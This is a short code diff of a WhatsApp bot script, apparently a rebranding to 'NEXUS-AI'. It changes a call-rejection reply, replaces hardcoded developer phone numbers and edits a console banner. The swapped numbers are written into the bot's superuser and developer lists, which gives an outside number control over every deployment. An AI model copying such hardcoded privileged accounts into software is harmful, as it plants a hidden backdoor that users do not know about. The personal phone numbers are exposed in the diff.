@@ -897,10 +897,7 @@ zk.ev.on("messages.upsert", async (m) => {
     // Delay for 1 second before sending a message
     setTimeout(async () => {
       await zk.sendMessage(callerId, {
-        text: `🚫 *Call Rejected❗*  
-Hi there, I’m *nexus ai* ⚠️.  
-⚠️ My owner is unavailable at the moment.  
-Please try again later or leave a message. Cheers! 😟`
+        text: `🚫 my boss can't pick! 🤙any call for now👻📞`
       });
     }, 1000); // 1-second delay
   }
@@ -951,10 +948,10 @@ Please try again later or leave a message. Cheers! 😟`
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254710772666';
-            const dj2 = '254710772666';
-            const dj3 = "254710772666";
-            const luffy = '254710772666';
+            const dj = '254785392165';
+            const dj2 = '254785392165';
+            const dj3 = "254785392165";
+            const luffy = '254785392165';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -962,7 +959,7 @@ Please try again later or leave a message. Cheers! 😟`
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t🌍B.M.B-TECH ONLINE🌍");
+            console.log("\t🌍NEXUS-AI ONLINE🌍");
             console.log("=========== written message===========");
             if (verifGroupe) {
                 console.log("message provenant du groupe : " + nomGroupe);
